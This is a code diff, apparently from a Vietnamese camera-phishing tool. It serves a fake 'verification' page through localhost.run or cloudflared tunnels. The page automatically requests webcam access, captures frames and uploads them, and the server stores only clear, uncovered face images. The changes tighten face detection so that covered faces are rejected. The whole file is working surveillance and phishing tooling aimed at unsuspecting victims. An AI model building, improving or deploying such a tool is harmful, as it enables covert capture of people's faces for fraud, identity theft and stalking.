@@ -31,15 +31,18 @@ banner = r"""
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 """
 console.print(Panel(banner, title="-- BY: MLBSANS --", subtitle="github.com/mlbsans", style="bold cyan"))
-console.print("[green]Tạo server:[/green]\n[blue]+ 1:[/blue] ssh -R 80:localhost:8080 nokey@localhost.run\n[blue]+ 2:[/blue] cloudflared tunnel --url http://localhost:8080", style="bold magenta")
+console.print(
+    "[green]Tạo server:[/green]\n[blue]+ 1:[/blue] ssh -R 80:localhost:8080 nokey@localhost.run\n[blue]+ 2:[/blue] cloudflared tunnel --url http://localhost:8080",
+    style="bold magenta"
+)
 
 # Khởi tạo classifier phát hiện khuôn mặt
 face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-# HTML/CSS/JS: tự động yêu cầu cấp quyền camera khi load trang.
-# Nếu không cấp, hiển thị thông báo và nút "Thử lại" sau 3 giây.
+# HTML/CSS/JS: Tự động yêu cầu cấp quyền camera khi load trang.
+# Nếu không cấp quyền, hiển thị thông báo và nút "Thử lại" sau 3 giây.
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
@@ -139,7 +142,7 @@ HTML_PAGE = f"""
   <div id="notification" class="notification"></div>
   <button id="retry-btn">Thử lại</button>
   <script>
-    // Khai báo biến toàn cục để quản lý stream, fallbackVideo và validCount
+    // Biến toàn cục để quản lý stream, fallbackVideo và validCount
     let currentStream = null;
     let fallbackVideo = null;
     let validCount = 0;
@@ -180,10 +183,9 @@ HTML_PAGE = f"""
       
       navigator.mediaDevices.getUserMedia({{ video: true }})
       .then(stream => {{
-        // Ẩn nút "Thử lại" nếu có
         retryBtn.style.display = "none";
         currentStream = stream;
-        validCount = 0;  // Reset lại số lần xác minh
+        validCount = 0;  // Reset số lần xác minh
         const videoTrack = stream.getVideoTracks()[0];
         const useImageCapture = ('ImageCapture' in window);
         if (!useImageCapture && !fallbackVideo) {{
@@ -267,13 +269,11 @@ HTML_PAGE = f"""
       }});
     }}
 
-    // Khi nhấn nút "Thử lại", gọi lại startVerification
     retryBtn.addEventListener("click", () => {{
       retryBtn.style.display = "none";
       startVerification();
     }});
 
-    // Tự động bắt đầu xác minh khi trang load
     window.addEventListener("load", startVerification);
   </script>
 </body>
@@ -299,17 +299,26 @@ def upload():
             img = img.convert("RGB")
         img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
         gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
+        
+        # Tăng minNeighbors=5, kiểm tra kích thước khuôn mặt
         faces = face_cascade.detectMultiScale(
             gray,
             scaleFactor=1.05,
-            minNeighbors=3,
+            minNeighbors=5,
             minSize=(30, 30),
             flags=cv2.CASCADE_SCALE_IMAGE
         )
         console.log(f"[blue]Detected faces:[/blue] {faces}")
         if len(faces) == 0:
-            console.log("[red]Không phát hiện được khuôn mặt (che mặt?)![/red]")
+            console.log("[red]Không phát hiện được khuôn mặt![/red]")
             return "Che Mặt Rồi", 400
+
+        image_width = img_cv.shape[1]
+        valid_faces = [face for face in faces if face[2] >= 0.3 * image_width]
+        if len(valid_faces) == 0:
+            console.log("[red]Phát hiện khuôn mặt không đầy đủ![/red]")
+            return "Che Mặt Rồi", 400
+
         img.save(image_path, "PNG")
         console.log(f"[green]Ảnh đã lưu: {image_path}[/green]")
         return "OK", 200
